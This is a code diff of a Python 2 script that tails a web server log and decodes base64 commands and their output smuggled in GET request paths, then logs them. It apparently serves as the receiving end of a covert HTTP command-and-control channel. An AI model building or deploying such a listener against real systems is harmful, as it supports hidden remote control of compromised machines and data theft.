@@ -1,3 +1,4 @@
+#!/usr/bin/python
 import sys, os
 import re
 import base64
@@ -24,10 +25,12 @@ Results = ""
 while True:
      
     with open('./ServerRequirements/log.txt', 'r') as f:
-        #info = f.read()
-        #print 'Readed: ' + info
+        #info = f.readlines()
+        #print 'Readed: ' + str(info)
         lineList = f.readlines() # read lines
-        lastLine = lineList[len(lineList)-1] # read last line
+        #lineList = info.readlines() 
+        #print "lineList is: " + str(lineList)
+        lastLine = lineList[len(lineList)-1] # read last linei
         #print "Last line is: " + lastLine # prints last line
             
         SearchStr = re.search(r'GET (.*?) HTTP', lastLine) # search for string between GET and HTTP.. which should be the base64
@@ -40,7 +43,9 @@ while True:
             
             try:  
                 Input = base64.b64decode(Output.split("/")[2]) # Made a 2 instead of 1 because of SErverRequirements
+                #print Input
                 Results = base64.b64decode(Output.split("/")[3])
+                #print Results
             except IndexError:
                 continue
             except TypeError:
@@ -49,16 +54,12 @@ while True:
             if Input != oldInput:
                 print "Command: " + Input
                 print "Output: " + Results
-                
+               
+                # Save to Log
                 f = open("./Logs/" + LOG + "-log.txt", "a")
                 f.write(Input + '\n')
                 f.write(Results + '\n')
                 f.write('\n')
-                # TODO: Save to Log
-                #echo "$Input" >> LOG
-                #echo "$Results" >> LOG
-                #echo "" >> $LOG
-                
     
         elif SearchDL:
             #print SearchDL.groups()
